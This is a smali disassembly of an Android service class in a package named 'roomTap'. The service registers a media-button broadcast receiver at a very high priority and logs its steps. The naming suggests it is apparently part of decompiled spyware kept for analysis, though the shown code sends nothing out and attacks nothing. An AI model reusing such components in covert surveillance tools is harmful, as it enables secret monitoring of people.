.class public Lcom/network/android/roomTap/MediaPlayerHandlerService;
.super Landroid/app/Service;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 3

    const-string v0, "MediaPlayerHandlerService onCreate"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    invoke-static {}, Lcom/network/android/agent/NetworkApp;->a()Landroid/content/Context;

    move-result-object v0

    :try_start_0
    const-string v1, "registerMediaPlayerIntentReciever start"

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    new-instance v1, Lcom/network/android/roomTap/MediaPlayerIntentReciever;

    invoke-direct {v1}, Lcom/network/android/roomTap/MediaPlayerIntentReciever;-><init>()V

    sput-object v1, Lcom/network/android/roomTap/MediaPlayerIntentReciever;->a:Lcom/network/android/roomTap/MediaPlayerIntentReciever;

    new-instance v1, Landroid/content/IntentFilter;

    const-string v2, "android.intent.action.MEDIA_BUTTON"

    invoke-direct {v1, v2}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    const/16 v2, 0x270f

    invoke-virtual {v1, v2}, Landroid/content/IntentFilter;->setPriority(I)V

    sget-object v2, Lcom/network/android/roomTap/MediaPlayerIntentReciever;->a:Lcom/network/android/roomTap/MediaPlayerIntentReciever;

    invoke-virtual {v0, v2, v1}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    const-string v1, "registerMediaPlayerIntentReciever exception. "

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method public onDestroy()V
    .locals 2

    const-string v0, "MediaPlayerHandlerService onDestroy"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {}, Lcom/network/android/agent/NetworkApp;->a()Landroid/content/Context;

    move-result-object v0

    :try_start_0
    const-string v1, "unRegisterMediaPlayerIntentReciever start"

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-object v1, Lcom/network/android/roomTap/MediaPlayerIntentReciever;->a:Lcom/network/android/roomTap/MediaPlayerIntentReciever;

    if-nez v1, :cond_0

    const-string v0, "unRegisterMediaPlayerIntentReciever m_MediaButtonReceiver is null. returningc"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :goto_0
    return-void

    :cond_0
    sget-object v1, Lcom/network/android/roomTap/MediaPlayerIntentReciever;->a:Lcom/network/android/roomTap/MediaPlayerIntentReciever;

    invoke-virtual {v0, v1}, Landroid/content/Context;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    const/4 v0, 0x0

    sput-object v0, Lcom/network/android/roomTap/MediaPlayerIntentReciever;->a:Lcom/network/android/roomTap/MediaPlayerIntentReciever;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    const-string v1, "unRegisterMediaPlayerIntentReciever exception."

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1

    const/4 v0, 0x1

    return v0
.end method
